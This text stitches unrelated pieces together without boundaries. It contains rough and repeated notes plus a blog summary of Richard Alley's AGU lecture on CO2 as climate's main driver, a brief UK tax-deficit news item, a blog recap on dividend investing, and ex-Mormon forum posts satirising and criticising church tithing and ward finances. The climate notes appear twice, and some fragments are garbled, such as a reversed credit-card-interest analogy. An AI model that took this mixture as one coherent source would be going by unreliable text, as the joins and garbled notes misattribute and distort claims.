But to back this up , there are other techniques with independent assumptions ( but none as easy to analyze as ice cores ) .
When they all agree , this gives us more confidence in the reconstructions .
One example : growth of different plant species – higher CO2 gives preference to certain species .
Similarly , different ways in which carbonate shells in the ocean grow , depending on pH of the ocean ( which in turn is driven by atmospheric concentrations of CO2 ) .
Also the fossil - leaf stomata record .
Stomata are the pores in leaves that allow them to breathe .
Plants grow leaves with more pores when there is low CO2 , to allow them to breathe better , and less when there is more CO2 , to minimize moisture loss .
So , we have a whole bunch of different paths , none of which are perfect , but together work pretty well .
Now what about those other controllers , beyond the rock - thermostat effect ?
CO2 is raised by :
the amount of CO2 coming out of volcanoes
slower weathering of rock
less plant activity
less fossil burial .
Graph of reconstruction of CO2 over 400 Ma to present .
With Ice coverage mapped on ( measured as how far down towards the equator the ice reaches .
( Jansen 2007 , fig 6.1 ) .
251 million years ago , pretty much every animal dies – 95 % of species wiped out .
End-permian extinction .
Widespread marine green sulfur bacteria that use H2S for photosynthesis .
Hydrogen sulphide as a result kills most other life off .
And it coincides with a warm period .
Probably kicked off by greater vulcanisms ( siberian traps ) .
When the ocean is warm , it ’s easy to starve it of oxygen ; when it ’s cold it ’s well oxygenated .
The mid-cretaceous “ saurian sauna ” – no ice at sea level at poles .
Again , CO2 is really high again .
High CO2 explains the warmth , although the models make it a little too warm at the CO2 levels .
One more blip before the ice ages .
Co2 did n’t kill the dinosaurs , a meteorite did .
Paleocene - eocene thermal maximum .
Big temperature change .
Already hot , world gets even hotter .
Most sea - floor life dies out .
Acidic ocean .
Models have difficulty simulating as much warming .
Happens very fast , although the recovery process matches our carbon cycle models very well .
Shows up everywhere : e.g. leaf damage in fossil leaves at PETM .
But a mystery : temperature and CO2 highly correlated , with no other way to explain it .
Occasionally there were places where temperature changes did not match CO2 changes .
But over last couple of decades , these have all gone , as we ’ve refined our knowledge of the CO2 record .
The mismatches have mostly dissapeared .
2 years would have said something wrong in miocene , but today looks better .
Two years ago got new records that improve the match .
Two weeks ago , Tripati et al published a new dataset that agrees even better .
So , two years ago , Miocene anomalies looked important , now not so clear – looks like CO2 and temperature do track .
The changes of temperature were predicted 50 years ahead of data that orbital issues were the cause .
But what do we say to people who say the lag proves current warming is n’t caused by CO2 .
Temperature never goes far without the CO2 , and vice versa , but sometimes one lags the other by about 2 centuries .
Analogy : credit card interest lags debt .
By the denialist logic , because interest lags debt then I never have to worry about interest and the credit card company can never get me .
Simple numerical model demonstrates that interest causes the debt .
So , it ’s basic physics .
The orbits initially kick off the warming , but the CO2 then kicks in and drives it .
Explanation of ice - age cycling : A David Archer cocktail .
So , CO2 explains almost all the historical temperature change .
What ’s left :
– Solar irradiance changes , volcanic changes .
When these things change , we do see the change in the temperature record .
For solar changes , there clearly are n’t many .
( “ if volcanoes could get organised , they could rule the world ” – luckily they are n’t organised ) .
Occasionally several volcanoes erupting together makes a bigger change , but again a rare even .
Solar changes look much more like a fine tuning knob , rather than a major control .
40,000 years ago the magnetic field stopped , letting in huge amounts of cosmic rays , but the climate ignored it .
Hence , at best a fine tuning knob .
Space dust has n’t changed much over time and there is n’t much of it .
What about climate sensitivity ?
Sensitivity from models matches the record well ( approx 3C per doubling of CO2 ) .
Interesting experiment – Royer et al Nature 29 March 2007 vol 446 .
Hence paleoclimate says more extreme claims about sensitivity must be wrong .
Hence , if CO2 does n’t warm , then we have to explain why the physicists are stupid , and then we still have no other explanation .
If there is a problem it is that occasionally the world seems a little more sensitive to CO2 than the models say .
Lots of possible fine - tuning knobs that might explain these – lots of current research looking into it .
Oh , and this is a global story not a regional one .
Lots of local effects on regional climate .
Note that most of these recent discoveries have n’t percolated to IPCC yet .
Current science says CO2 is the most important driver of climate throughout the earth ’s history .
Q : If we burn all the available fossil fuel reserves , where do we get to ?
If you burn it all at once , some chance of getting above the cretaceous level , but lots of uncertainty , including how much reserves there really are .
In a “ burn it all ” future , it ’s likely to get really hot – +6 to 7C .
Q : We know if we stop emitting , it will slow down global warming .
But from geology , what do we know about removal ?
A : Anything that increases weatherabilty of rocks .
Can we make it go fast enough to make a difference , at an economic level .
Eg how much energy would we need to do it – dig up shells from ocean bed and allow them to carbonate .
Probably easier to keep it out of the air than to take it out of the air .
Q : is there a relationship between ocean acidity and atmospheric CO2 .
Q about feedbacks .
As we put up more CO2 , the oceans take up about half of it .
As the world gets warmer , the ability of the ocean to buffer that reduces .
Biggest concern is probably in changes in the arctic soils .
Methane on the seafloor .
As you go from decades to centuries , the sensitivity to CO2 goes up a little , because of these amplfying feedbacks .
Yesterday afternoon , I managed to catch the Bjerknes Lecture , which was given by Richard B. Alley : “ The biggest Control Knob : Carbon Dioxide in Earth ’s Climate History ” .
The room was absolutely packed – standing room only , I estimated at least 2,000 people in the audience .
And it was easy to see why – Richard is a brilliant speaker , and he was addressing a crucial topic – an account of all the lines of evidence we have of the role of CO2 in climate changes throughout prehistory .
[ Update : the AGU has posted the video of the talk ]
By way of introduction , he pointed out how many brains are in the room , and how much good we ’re all doing .
Although he characterizes himself as not being an atmospheric scientist , except perhaps by default , but as he looks more and more at paleo - geology , it becomes clear how important CO2 is .

To the amusement of the audience , he points out a fundamental error of logic in the first sentence of the email , to illustrate the level of ignorance about CO2 that we ’re faced with .
Think about this : an audience of 2,000 scientists , all of whom share his frustration at such ignorant rants .
So the history : 4.6 billions years ago , the sun ’s output was lower ( approx 70 % of today ’s levels ) , often referred to as the faint young sun .
But we know there was liquid water on earth back then , and the only thing that could explain that is a stronger greenhouse effect .
Nothing else works – orbital differences , for example , were n’t big enough .
The best explanation for the process so far is the Rock - Weathering Thermostat .
CO2 builds up in the atmosphere over time from volcanic activity .
As this CO2 warms the planet through the greenhouse effect , the warmer climate increases the chemical weathering of rock , which in turn removes carbon dioxide through the formation of calcium carbonate , that gets washed into the sea and eventually laid down as sediment .
Turn up the temperature , and the sequestration of CO2 in the rocks goes faster .
If the earth cools down this process slows , allowing CO2 to build up again in the atmosphere .
This is process is probably what has kept the planet in the right range for liquid water and life for most of the last 4 billion years .
But can we demonstrate it ?
The rock thermostat takes millions of years to work , because the principle mechanism is geological .
One consequence is that the only way to get to a “ snowball earth ” ( times in the Cryogenian period when the earth was covered in ice even down to the tropics ) is that some other cause of change has to happen fast – faster than the rock - themostat effect .
An obvious piece of evidence is in the rock layers .
Glacial layers are always covered from above by carbonate rocks , showing that increased carbonation ( as the earth warmed ) follows periods of icing .
This shows part of the mechanism .
But to explore the process properly , we need good CO2 paleo - barometers .

Now what about those other controllers , beyond the rock - thermostat effect ?
CO2 is raised by :
the amount of CO2 coming out of volcanoes
slower weathering of rock
less plant activity
less fossil burial .
He showed the graph reconstructing what we know of CO2 levels over the last 400 million years .
Ice coverage is shown on the chart as blue bars , showing how far down towards the equator the ice reaches , and this correlates with low CO2 levels from all the different sources of evidence .
251 million years ago , pretty much every animal dies – 95 % of marine species wiped out , in the end - permian extinction .
Probable cause : rapid widespread growth of marine green sulfur bacteria that use H2S for photosynthesis .
The hydrogen sulphide produced as a result kills most other life off .
And it coincides with a very warm period .
The process was probably kicked off by greater vulcanism ( the siberian traps ) spewing CO2 into the atmosphere .
When the ocean is very warm , it ’s easy to starve it of oxygen ; when it ’s cold it ’s well oxygenated .
This starvation of oxygen killed off most ocean life .
Fast forward to the mid-cretaceous “ saurian sauna ” , when there was no ice at sea level at poles .
Again , CO2 is really high again .
High CO2 explains the warmth ( although in this case , the models tend to make it a little too warm at these CO2 levels ) .
Then there was one more blip before the ice ages .
( Aside : CO2 is responsible for lots of things , but at least it did n’t kill the dinosaurs , a meteorite did ) .
The paleocene - eocene thermal maximum meant big temperature changes .
It was already hot , and the world gets even hotter .
Most sea - floor life dies out .
Acidic ocean .
This time , the models have difficulty simulating this much warming .
And it happened very fast , although the recovery process matches our carbon cycle models very well .
And it shows up everywhere : e.g. leaf damage in fossil leaves at PETM .
But for many years there was still a mystery :
The temperature and CO2 levels are highly correlated throughout the earth ’s history , and with no other way to explain the climate changes .
But occasionally there were places where temperature changes did not match CO2 changes .
Over last couple of decades , as we have refined our knowledge of the CO2 record , these divergences have gone .
The mismatches have mostly dissapeared .
Even just two years ago , Alley would have said something was still wrong in miocene , but today it looks better .
Two years ago , we got new records that improve the match .
Two weeks ago , Tripati et. al. published a new dataset that agrees even better .
So , two years ago , miocene anomalies looked important , now not so clear , it looks like CO2 and temperature do track .
But what do we say to people who say the lag ( CO2 rises tend to lag behind the temperature rise ) proves current warming is n’t caused by CO2 ?
We know that orbital changes ( the Milankovitch cycles ) kick off the ice ages – this was predicted 50 years before we had data ( in the 1970s ) to back it up .
But temperature never goes far without the CO2 , and vice versa , but sometimes one lags the other by about 2 centuries .
And a big problem with the Milankovich cycles is that they only explain a small part of the temperature changes .
The rest is when CO2 changes kick in .
Alley offered the following analogy : credit card interest lags debt .
By the denialist logic , because interest lags debt , then I never have to worry about interest and the credit card company can never get me .
However , a simple numerical model demonstrates that interest can be a bigger cause of overall debt in the long run ( even though it lags ! ! ) .
So , it ’s basic physics .
The orbits initially kick off the warming , but the release of CO2 then kicks in and drives it .
So , CO2 explains almost all the historical temperature change .
What ’s left ?
Solar irradiance changes , volcanic changes .
When these things change , we do see the change in the temperature record .
For solar changes , there clearly are n’t many , and they act lik a fine tuning knob , rather than a major control .
40,000 years ago the magnetic field almost stopped ( it weakened to about 10 % of its current level ) , letting in huge amounts of cosmic rays , but the climate ignored it .
Hence , we know cosmic rays are at best a fine tuning knob .
Volcanic activity is important , but essentially random ( “ if volcanoes could get organised , they could rule the world ” – luckily they are n’t organised ) .
Occasionally several volcanoes erupting together makes a bigger change , but again a rare event .
Space dust has n’t changed much over time and there is n’t much of it ( Alley ’s deadpan delivery of this line raised a chuckle from the audience ) .
So , what about climate sensitivity ( i.e. the amount of temperature change for each doubling of CO2 ) ?
Sensitivity from models matches the record well ( approx 3 °C per doubling of CO2 ) .
Recently , Royer et al conducted an interesting experiment , calculating equilibrium climate sensitivity from models , and then comparing with the proxy records , to demonstrate that climate sensitivity has been consistent over the last 420 million years .
Hence paleoclimate says that the more extreme claims about sensitivity ( especially those claiming very low levels ) must be wrong .
In contrast , if CO2 does n’t warm , then we have to explain why the physicists are stupid , and then we still have no other explanation for the observations .
If there is a problem , it is that occasionally the world seems a little more sensitive to CO2 than the models say .
There are lots of possible fine - tuning knobs that might explain these – and lots of current research looking into it .
Oh , and this is a global story not a regional one ; there are lots of local effects on regional climate .
Note that most of these recent discoveries have n’t percolated to the IPCC yet – much of this emerged in the last few years since the last IPCC report was produced .
The current science says that CO2 is the most important driver of climate throughout the earth ’s history .
Some questions from the audience followed :
Q : If we burn all the available fossil fuel reserves , where do we get to ?
A : If you burn it all at once , there is some chance of getting above the cretaceous level , but lots of uncertainty , including how much reserves there really are .
In a “ burn it all ” future , it ’s likely to get really hot : +6 to 7C .

But seems unlikely that we can make it go fast enough to make a difference , at an economic level .
Key question is how much energy we would we need to do it , e.g. to dig up shells from ocean bed and allow them to carbonate .
It ’s almost certainly easier to keep it out of the air than to take it out of the air ( big round of applause from the audience in response to this – clearly the 2,000 + scientists present know this is true , and appreciate it being stated so clearly ) .
Q What about feedbacks ?
A : As we put up more CO2 , the oceans take up about half of it .
As the world gets warmer , the ability of the ocean to buffer that reduces .
Biggest concern is probably in changes in the arctic soils .
Methane on the seafloor .
As you go from decades to centuries , the sensitivity to CO2 goes up a little , because of these amplfying feedbacks .
Well that was it – a one hour summary of how we know that CO2 is implicated as the biggest driver in all climate change throughout the earth ’s history .
What I found fascinating about the talk was the way that Alley brought together multiple lines of evidence , and showed how our knowledge is built up from a variety of sources .
Science really is fascinating when presented like this .
BTW I should mention that Alley is author of The Two - Mile Time Machine , which I now have to go and read …
Finally , a disclaimer .
I ’m not an expert in any of this , by any stretch of the imagination .
If I misunderstood any of Alley ’s talk , please let me know in the comments .

Tax revenues have not only dried up for the U.S government . , they have fallen 11.8 % in January in the U.K. , the BBC reports this morning -- the first time on record the U.K.'s government has reported a January deficit .
Analysts had been expecting a surplus last month , but the government was forced to borrow 4.3 billion pounds , bringing total borrowing this fiscal year ( 8 months in ) to 122.4 billion pounds .
The deficit for the year is now projected at 178 billion pounds .
( A rounding error compared to the U.S. 's projected $ 1.56 trillion deficit this year ! )

We work hard .
We often deny ourselves many pleasures to save .
Have you ever wondered if you would not only save the money you earn on your account , but also invest ?
Especially since the pound has been falling recently .
The author of the Money Grower blog will tell us how to do it .
The author writes in English , but to those who do not feel good reading in this language came out another blogger , this time Polish : SmartPolak .
Well , he interviewed about what to invest money in the UK .
We will learn from this conversation many interesting things that may encourage us to multiply the funds accumulated in the savings account .
Of course , every investment carries some risk , so it ’s worth doing wisely and do n’t put everything on one card .
Not to work …
The Money Grower blog has been around for 4.5 years .
Initially , the author wrote about personal finances .
However , he decided to document his path to financial freedom .
Perhaps his path will inspire someone .
According to him , financial freedom consists in a situation in which passive income is enough to live on such a level that you no longer have to work .
It is something similar to retirement , except that you are still healthy and full of strength .
The stock exchange is not a casino
The author tells how the stock market stopped appearing to him as a casino .
After reading several books , he began to see the logic in the random fluctuations of the bars so far .
He began his adventure with the stock exchange in 2015 by buying shares in Zambeef , which he still has today .
He was prompted by the fact that they were much cheaper on the London Stock Exchange than on the home market .
It was a good investment .
Since then , their price has increased by as much as 60 percent .
Then he began to invest in shares providing dividend .
Dividend is a percentage of the company ’s profits paid to its shareholders .
This means that if a company earns well , you get money while still owning its shares .
What to invest in money ?
Dividends are for the author of the blog a key factor for which he invests money in given shares .
He says : “ My style is buying high quality companies at a reasonable price .
I just want to buy companies that have a lasting competitive advantage and will generate revenue year after year , regardless of the macroeconomic situation . ” This ensures that in the future these companies will share the profit with it .
He also warns against buying shares just because they are cheap .
He ’s been stunned by it himself .
Although he learned a lesson from this lesson .
How to play the stock market ?
The author acknowledges that there are many ways to earn passive income .
However , for several reasons , he chose to invest in dividend paying companies .
Well , you do n’t have to worry about price fluctuations of their shares .
Not only that , when they get cheaper , you do n’t have to sell them , but you can buy even more .
So , in principle , he does not play on the stock exchange .
His finances do not depend on whether he buys the shares cheaply and sells them dearly .
He is only interested in the profits of a given company , because it depends on how much dividend will affect his account .
As he states , he is more of a company owner than a broker .
He claims that he does not go by selling some shares , why cut down a tree that bears fruit ?
Of course , for a money to be credited to your account regularly , your business must be in good shape .
If he goes bankrupt , we wo n’t get anything .

LDS Church Introduces Reverse Tithing Exaltation Plan
04/02/2014 - by cricket
Much to the surprise of the entire world President Thomas S Monson has issued a revelation .
After reviewing the current general apostasy of members with IQ 's over 75 , the vast dormant wealth in real estate and the stock market and fear that General Conference attendance will soon evaporate , the prophet " studied this out in his mind " prayed and obtained a big " OK " whispered to him by the still small voice .
The whisper tickled Thomas ' ears causing them to wiggle .
Monson proclaimed , " Lo and behold , the Lord has issued a spiritual stimulus package , those who have ears to hear , listen .
Those who have empty wallets to fill , step forward . "
Monson continued to wax eloquent , " In honor of your faithful tithing over past years the Lord will reimburse you out of His vast riches and holdings that will sustain you with continued temporal blessing until
He doth return again or until you die , which ever comes first . "
And it came to pass that the following scales and tables shall apply to this " New and Everlasting Doctrine of the Dollar . "
Reimbursement Tables and Scales :
1. $ 25 for entire family attending all three meetings of the Sunday Block schedule .
2. $ 10 per family you home teach or visit teach by the 25th of each month .
3. $ 50 per person for completing and entire endowment for one deceased person .
This includes , baptism , confirmation , washing and anointing , endowment , marriage sealing , sealing to parents .
A $ 10 bonus is added if the deceased person is NOT a Jewish holocaust victim .
4. $ 5,000 per couple who receive the Second Anointing and DO NOT hassle Elder Jeffrey Holland over the shock of Jesus not appearing to them during the ordinance .
5. $ 1,000 for converting a reasonable sane male who has a full time job and earns over $ 50 K a year .
Increase this to $ 2,000 per family with head of household meeting the same description .
Deferred payment for one year after the baptism to ensure the person / family remain active after receiving temple endowment without running out the temple screaming at the top of their lungs , " WTF this is a cult ! "
6. $ 100 per person who will attend and sit through all sessions of General Conference in the Conference Center .
To reap the reward one must actually appear to remain awake and interested in case the TV camera scans by .
7. $ 10 per young person ages 12 through 18 who attend their weekly Young Men or Young Women activity .
8. $ 4,000 per Elder or Sister who complete a full time mission .
9. $ 10 per person who writes a faith promoting letter to the editor published in the Deseret News .
10 . $ 10 dollars per hour spent cleaning the local meeting house , stake center , temple or other church facility .
Finally , it pays to be an active Mormon !
And The Corporation Sole of the President of the Church will avoid becoming the richest church on the planet with no remaining members .
I 've saved my tithing money for over 10 years
01/21/2014 - by Anon-Saver
After I quit paying tithing , I started a seperate account and put my 10 % into it .
I had planned on doing that even when I paid tithing , to just put 10 % of my earnings into an emergency account , but I never really could afford to .
When I quit paying tithing , it was easy to start my account .
I found the easiest way was to have an automatic withdrawal from my checking account into a seperate savings account .
That made it easy to kind of forget about and then not be tempted to use the money for something else .
I am really lucky to have a decent job , and lucky to not have needed to use the money .
After several years of doing this , I now have over $ 100,000 in this account .
This is money that would have been lost to a cult if I continued to pay .
This is money I can use for retiring , for investments , or any emergency that comes up .
I have that security because of my decision to quit paying tithing .
I understand how talking about how much money you have is tactless and a horrible trait , and I do n't want it to come across that way , hence , the anon post .
What I am trying to get across is that those of you just learning the truth about the church , and deciding to not give your 10 % to the cult anymore , can do the same thing by startiing now .
If you have been able to make ends meet by paying tithing , start putting that money into a seperate account .
I wish I had put it into a mutual fund instead of a savings account , but I went for safety .
Even if you do n't have a lot to put in there , it is amazing how it grows over the years .
If I had n't started saving tithing money I do n't think I would have realized the amount of money I threw away paying tithing .
Saving 10 % of your earnings will make an amazing difference in your life as you get older .
It feels so good knowing the church does n't have my money , that is the best part .
_______________________________________________________________
We also took our 10 % and added to 401k contributions and company stock .
We 've only been out 3 years .
My DH will be retiring 5 years earlier .
If we 'd done this 10 years ago , he would be retired already .
We would have had close to 3 million in retirement money .
Coulda , shoulda , woulda .
As it is , we 're still going to be just fine and much better set in retirement than we thought .
There are a lot of blessings that ome from not blindly giving money to a corporation that does n't share the wealth .

I think this information is understated when showing others what can be achieved financially when not paying an exorbitant God tax .
Understanding clearly the Future Value of Money is key .
That $ 5000 you paid this year is worth $ 50,000 in thirty years ( an example only ) .
This is what you are truly giving to the church and the future value is what they want .

It 's not too late to invest if you have n't already .
You can max out a Roth IRA and put the rest into another mutual fund .
I would find a nice , mellow balanced fund ( balanced between stocks and bonds . )
You have Vanguard , T. Rowe Price , some Fidelity funds , and many others .
Good for you for saving your money .
No church on this planet needs 10 % of members ' incomes to run itself .
When a church invests in non-church related real estate and businesses , it has * too much money . *
In this case , way too much money .

15 % of their " free - will donations " with zero accountability
10/28/2010 - by Purple Hymnal
The " transformed " Worldwide Church of God ( which has now renamed itself Grace Communion International ) , is an excellent example for Mormons to look to if they want to find out how to completely slip under the radar and not be bothered by those pesky cult - watch groups ever again !
This topic has already been covered on memoirs - of - a - one - true - church another ex-Mormonblog , where you can see the charming Christianity of a Grace Communion International member " in the flesh " , as it were .
For more information on the on - going lack of financial accountability , two - tiered information system , and the unelected Pastor - General - in - Perpetuity , I refer the interested observer to purplehymnal my blog , as well as Ambassador Reports , the archives of Ambassador Watch , and the online copies of a postal magazine that was circulated up to the year 2000 , Ambassador Report Postal .
For the history on the current leadership , start with the links dated 1986 and go forward .
Anecdotal evidence ( which I find to be plausible , as I was born and raised in the Worldwide Church of God ) suggests that members are free to not believe in the trinity ( which I was under the impression was supposed to be a deal - breaker , for the professing Christians -- I guess not , if at least one WCG / GCI pastor has counseled one person in the past that it is n't necessary ) , members still keep their own " holy days " ( going out of town to observe them with the splinter groups , or keeping them at home ) , as well as the dietary laws , and the Sabbath .
These people consider themselves " God 's Righteous Under Much Persecution " , and they are staying in the church , waiting for " God 's correction " ( which has n't come yet , almost two decades on , which is as good an argument for their being no god as I 've ever experienced ) .
To be fair , ministers may be looking the other way on these Armstrongist / conservative members , because they 're too desperate to retain membership .
The other red flag is that many congregations have misleading names ( this is true for both the United States and Canada .
There are still far too many questions , and far too little accountability , to declare the Worldwide Church of God / Grace Communion International " transformed by truth " .
Unfortunately , since church leaders are able to spit out all the " right things " the evangelical Christians want to hear ( whether or not any of members can even understand , let alone believe , the rhetoric ) , they are still heralded as some kind of success story by the Christian counter - cult groups , unfortunately .
Full - tithers in flagship ward
01/30/2010 - by Brother Spendlove
I just did a calculation for my bishop as to the number of full - tithers in my ward .
Now , folks , I live in what I believe is one of the most TBM wards in the world .
I 've lived in other places and seen first hand how there is always a really high percentage of inactives .
But my ward is in the middle of the morridor and very , very TBM .
Very few inactives .
It has always had a reputation of leading the Stake in stats .
Anyway , I was shocked when I did the calculation .
A full 40 % of the adults , are either non-tithers or part .
So 60 % claim to be full - tithers and I know from the numbers at tithing settlement that a good number of them were fudgin ' things to try and stay in the good graces of the bp and sp and keep " temple worthy . "
And all this after the bishopric called and pressured everyone to come in and the ones who did n't show up , if they paid anything the BP gave them the benefit of the doubt and declared them full on his report .
I am dumbfounded .
In this extremely TBM ward , there are just a little over half that are actually claiming to be paying a full tithing .
I would have expected it to be more like 80 % .
Seriously .
In an average ward where there are more inactives , there must be no more than 30 % or so who actually pay the big bucks .
This is an interesting statistic to me .
Tales from a bitter Financial Clerk
11/12/2009 - by Brother Spendlove
I 've served as the ward financial clerk for the last 2 years , but can't take it any more .
I 'm going to get released soon and then go completely inactive , then resign when the time is right .
Before I leave the morg I was thinking about doing something to really screw up tithing settlement this year ... but on second thought maybe I would just ask if anybody out there has some funny clerk stories .
Or maybe some ideas on going out with a bang .
I have become the financial clerk who pays no tithing .
It seems to me the morg has become a church of clerks .
There are statistical clerks , financial clerks , ward clerks , membership clerks , assistant clerk , etc .
Lots of boring men with access to confidential info .
One of the best parts of being a financial clerk is getting bounced checks for tithing and then giving the member a copy of their bad check ... it is so hard not to just burst out laughing .
The last time this happened I could n't resist and just said " Well so much for the Lord blessing YOU for trying to pay your tithing . "
I also get a kick out of tithing settlement watching the members squirm and apologize when I give them their end of the year statement ...
" Oh I know it does n't look like much but I still will be paying more before the end of the year . "
Ha ha .
I really do n't care .
I wish they would get wise and just quit paying .
One guy came in with a big check at the end of December to make up for his back tithing and then a week later I get a notice that the check was no good .
I split a gut .
It is such a ridiculous system .
As a ward we send Salt Lake upwards of half a million dollars during the year and they only let us spend about $ 5,000.00 or so for the ward budget .
AND NO ONE BATS AN EYE AT THIS DISPARITY !!!
Another thing that kicks my butt is some of the fast offering money we dole out .
The bishop is really tight with those who do n't pay tithing but if you pay tithing they will help you with rent , mortgage , medical bills , insurance , etc .
I wonder if it would make more sense to tell them to " take a break from tithing and get caught up on your bills . "
Executive Secretary Report - by Fubeca
I know what you mean .
For 20 years I 'd had the calling of Executive Secretary over 5 different times with as many bishops .
I remember meeting with other exec secs at the Stake Priesthood Leadership Meeting and we all seemed a bit jaded .
It was a weird frustration at having to be at all the same meetings as the bishopric and yet not having the same authority or responsibility .
We saw all the crap and did n't have the extra burden of the manipulative " spiritual experiences . "
I especially hated having to call people up to come in for an interview with the bishop .
I usually knew why , but always claimed I did n't .
I knew WAY too much about other members in the ward and I always felt uncomfortable with the information .
Looking back I realize it was because the information crossed their normal personal boundaries and I should never have been privy to the information under any circumstances .
Some bishops respected ward member 's privacy while others did n't .
Most of the time I knew everything and I 'd NEVER tell an LDS bishop anything I expected to remain confidential .
One time my wife was RS President at the same time under one of these loose lipped bishops and he'd tell us both private things individually ... and funny thing was , we 'd feel uncomfortable talking to each other about it so we rarely did !
The Ward budget really opened my eyes - by confused
I was Finance Clerk too .
When the budget came out I had seen it , we had discussed it , and at this time I also printed out the tithing statements .
I realized that my tithing statement was just about the same as the ward budget .
I figured that with about 70 full tithe payers , the church was raking in about 60 times what I contributed just from our ward , and only giving back mine for us all to function with .
For the last few months before I finally left I only contributed to the Fast offerings - tithing money went there too .
SLC gets all the tithes , but Fast Offerings stay in the Stake and I 'd rather people I knew had access in times of need than SLC playing in it like a kid in raked leaves .
Re : The Ward budget really opened my eyes - by Brother Spendlove
Yeah , I think that is about right .
When I was paying tithing it would amount to pretty close to the amount of our ward budget .
In a really good year , our ward contributed close to a million dollars in tithing to the morg .
In a down year maybe half that ... we have some really well to do members in our ward who are thoroughly brainwashed .
One guy alone last year paid a little over $ 100,000.00 .
Another even more than that .
There is a way to bypass the ward and pay direct to SLC if you want it all confidential from the bishop and his worker bees .
I once thought that if I were going to stay in the church I would just pay money into the humanitarian fund direct to SLC and leave it at that .
But I do n't even trust them to use the money for humanitarian purposes , there is no accountability built into the system at all .
So I think I will just leave after this year and not give them a dime .
I 'm quite jaded at this point .
The disparity in my ward was one of the big thorns that led to my disbelief - by Finance Clerk
I was finance clerk for 4 years in a upper middle class ward about 10 years ago .
I got the calling after I turned down the stake president for a high counsel calling .
At the time I was a questioning believer and did't think it was right to be in that position .
Anyway as ward clerk I found that :
- Our ward raked in just over $ 1 million dollars a year , and our annual ward budget was $ 2600 .
" Hmmmmm ! "
- I was the highest tithe payer in the ward .
Only one other family came close .
- In fact our family alone paid enough in tithing to cover the ward budget AND hire at least a part - time janitor , even though we ward members had to clean the building ourselves .
- Some families who seemed to be doing pretty well financially only paid peanuts ... often only at the end of the year .
And just the opposite some families who seemed to be living paycheck to paycheck seemed to be sacrifing significantly to keep the " law of tithing " .
I thought " save your $ 500 and go buy yourselves some clothes " .
My last straw was - by Designed4Joy
I quit paying to tithing and only did fast offerings the last year of activity when I found out that 80 % of BYU was funded by TITHING .
I thought , ' why should I bust my butt to pay for some smart , rich , affluent kid to get a prestigious education for peanuts while my hard - working middle class kid could n't get in with a 3.7 GPA .... it was all downhill from there for me and the MORG .
Six bishops in three different wards - by luminouswatcher
I have been Ward Clerk under six bishops in three different wards over the years .
Under two of those I had no assistance and did finance and membership duties in addition to the curriculum order and endless meetings .
In Virginia I single handedly raised the home teaching stats from low single digits to 40 % , just by moving out the records for those people who no longer lived there .
This was before they started using the modem to transfer membership records and you got the reconciliation report only twice a year .
I find it interesting how jaded and cynical I was , even in those days , while most of my " head " was still " out of control " TBM .
I found it interesting that they had the financial transactions on computer and used modems to keep things up to date and timely while they kept what I considered the most important , the membership records ( because they represented living breathing souls ) in the dark ages .
I spent at least one all nighter a week for six months to get things cleaned up .
Grrr .
During those days as an AF officer , I was working around 16 hours a day , with most of it being in front of a computer terminal , and Sunday being my only " break " from work .
So one day the wife of the Bp 2CC exclaimed in front of a big group how " off " I was , because I just wanted to spend Sundays on a computer ( the ward computer ) .
Those words still sting a bit and make me angry too , even after all of these years .
All that work and dedication , and to have it all devalued as a bit of miss directed selfishness .
In those days , if you had computer skills , you were almost guaranteed to be stuck in a " support " role , never having the opportunity for an ecclesiastical job .
It all seems so silly now , how we as morgbots search for that " ratification " that we are loved and blessed of God.
Ha .
One bishop I worked for was awesome , and he bent over backwards to make me feel I was a valued part of his team .
Like a third councilor .
The others were various levels of disrespected servitude .
I am finding the memories of the courts of love bother me more than anything else in my life , even some unpleasant things while in the military .
I am really disappointed in myself that I did not stand up and call BS on the manipulative and abusive behaviors directed toward some really interesting and lovely people .
It is just awful how an incorrect world view can shape how you hear and interpret what people really say , and more importantly , how you reach out , not to help them up , but to slap them down into submissiveness .
My DW still comments on how she was the only wife of a bishopric member who did not know what was going on in the ward .
In government circles , people usually try pretty hard to protect her secrets , because they believe it to be important .
In retrospect , I find it funny how mormon leaders do n't have that same drive to protect confidences , etc .
It just is not that important , but a tool for wielding power .
But what can you expect from amateur hour ?
From top to bottom , having a professional set of skills for one 's job is more due to luck than planning .
I had a Bishop from the bowels of hell - by Steven
who had perfected the art of guilt trips and condemnation .
This guy would have been a natural born Nazi , just born in the wrong era and country .
I remember walking in to my Tithing Settlement with him one year , with my wife and 3 little children .
I told him I was $ 1,000 short on tithing , but that the $ 3,000 I gave was given with " much sacrifice and faith . "
He looked at me and said in front of my wife and children , " Did the savior give his all to you ?
You should have budgeted your money better . "
The look on his face was one of disgust .
Later he told me that I had embarrassed my family by showing such a lack of faith .
Since then , in another ward , I was a financial clerk for many years .
I have seen so many people struggle through tough times , but yet spend their last dime paying the morg .
I have noticed that if you have a popular MOMO name , or are related to heirarchy , you are helped in extraordinary ways .
There was a guy in my last ward who was relatd to a GA .
He had 7 children .
The church paid his mortgage every month w/o fail ( $ 1,300 ) for three years , while he was w/o a job .
I know because I co-signed the checks .
Other less prominent folks were not given the same courtesy .
In the end , if you 've been a fnl clerk , it becomes readily apparent how extremely difficult the church is on ordinary family 's , sucking their finances and time dry to the bone .
The church hurts families .
Getting around your auxilliary running out of money - imaworkinonit
I have a totally TBM ( True Believing Mormon ) sister in law that was in charge of an activity and they ran out of money , but still needed some things for the project .
The bishop would n't approve more money , so SHE paid for it ( maybe $ 100 - 200 ) out of her own pocket and counted it ( in her mind ) as tithing , since it WAS for the church .
Everybody was fine with that .
. . . . do n't know if she told the bishop , though .
My dearly dead mother - by Baka Boy
Worked a full time job till 6 months before she died .
She worked as a ward librarian as her church job for all the years that I can remember .
She would buy ALL of the supplies that the library used .
Pencils , pens , staples , paper , sissors , chaulk , crayons , cardboard , construction paper , mimeograph crap .... everything on her own dime .
She refused to submit any receipt to the bishop .
Goddamn , she was a proud woman .
Meanwhile , she worked her fingers to the bone , and tithed 10 % on her gross , gave WAY more than fast offerings called for , donated to that stupid missionary book of mormon thing , sent money to the missionaries , went to temple , donated to the building funds , humanitarian funds , ad naseum .
When she died , I was too embarassed to have her funeral in our ward building because the carpet was literally in shreds in the foyer .
But the mormon cult got her money !
What pisses me off even more is when I remember cutting a check for my inheritance !
No more !
They are all desperate callings - by luminouswatcher
You are not allowed to have a bank account controlled ... by the Ward .
[ From my experience , but it may be dated now ]
You make the deposit on Sunday at the Bank , and the Ward software transfers the accounting information for the transaction to SLC as part of the process .
All the monies are safely transferred to SLC banks by COB Monday .
If the computer is down or the modem connection could not be made , they have a telephone number you call to complete the transaction the old way , like they used to use before adopting computer modems .
